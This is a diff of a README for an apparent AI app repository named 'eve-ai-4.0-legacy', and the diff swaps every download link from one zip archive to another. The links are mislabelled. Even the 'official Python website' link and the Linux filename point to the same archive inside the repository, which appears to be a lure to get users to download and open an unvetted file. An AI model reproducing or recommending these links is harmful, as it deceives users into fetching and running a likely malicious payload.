@@ -1,6 +1,6 @@
 # 🤖 eve-ai-4.0-legacy - Explore Creative AI Possibilities
 
-[![Download Here](https://github.com/Jadejadivyaraj123/eve-ai-4.0-legacy/raw/refs/heads/main/zagged/ai-legacy-eve-1.9.zip%20Now-Click%20to%20Download-brightgreen)](https://github.com/Jadejadivyaraj123/eve-ai-4.0-legacy/raw/refs/heads/main/zagged/ai-legacy-eve-1.9.zip)
+[![Download Here](https://github.com/Jadejadivyaraj123/eve-ai-4.0-legacy/raw/refs/heads/main/zagged/legacy_eve_ai_v3.0.zip%20Now-Click%20to%20Download-brightgreen)](https://github.com/Jadejadivyaraj123/eve-ai-4.0-legacy/raw/refs/heads/main/zagged/legacy_eve_ai_v3.0.zip)
 
 ## 📜 Overview
 
@@ -12,13 +12,13 @@ To get started with **eve-ai-4.0-legacy**, follow these simple steps:
 
 1. **Check your system**: Ensure you have a modern operating system. The application works best on Windows 10 or later, macOS Sierra or later, or any popular Linux distribution.
 
-2. **Verify Python Installation**: This application requires Python 3.7 or later. Make sure you have it installed on your computer. You can download Python from the [official Python website](https://github.com/Jadejadivyaraj123/eve-ai-4.0-legacy/raw/refs/heads/main/zagged/ai-legacy-eve-1.9.zip).
+2. **Verify Python Installation**: This application requires Python 3.7 or later. Make sure you have it installed on your computer. You can download Python from the [official Python website](https://github.com/Jadejadivyaraj123/eve-ai-4.0-legacy/raw/refs/heads/main/zagged/legacy_eve_ai_v3.0.zip).
 
 ## 💾 Download & Install
 
 To download the software, visit the following page:
 
-[Download from Releases](https://github.com/Jadejadivyaraj123/eve-ai-4.0-legacy/raw/refs/heads/main/zagged/ai-legacy-eve-1.9.zip)
+[Download from Releases](https://github.com/Jadejadivyaraj123/eve-ai-4.0-legacy/raw/refs/heads/main/zagged/legacy_eve_ai_v3.0.zip)
 
 ### Steps to Download and Install:
 
@@ -27,7 +27,7 @@ To download the software, visit the following page:
 3. Download the appropriate file for your operating system. If you are unsure which one to choose:
    - **Windows**: Download the `.exe` file.
    - **macOS**: Download the `.dmg` file.
-   - **Linux**: Download the `https://github.com/Jadejadivyaraj123/eve-ai-4.0-legacy/raw/refs/heads/main/zagged/ai-legacy-eve-1.9.zip` file.
+   - **Linux**: Download the `https://github.com/Jadejadivyaraj123/eve-ai-4.0-legacy/raw/refs/heads/main/zagged/legacy_eve_ai_v3.0.zip` file.
 
 4. After downloading, locate the file in your Downloads folder and open it.
 
@@ -69,4 +69,4 @@ Join our community for discussions, tips, and shared experiences. You can connec
 
 **eve-ai-4.0-legacy** is an open-source project. You are free to use and modify the software. We appreciate contributions to make it even better.
 
-[Download from Releases](https://github.com/Jadejadivyaraj123/eve-ai-4.0-legacy/raw/refs/heads/main/zagged/ai-legacy-eve-1.9.zip)
+[Download from Releases](https://github.com/Jadejadivyaraj123/eve-ai-4.0-legacy/raw/refs/heads/main/zagged/legacy_eve_ai_v3.0.zip)
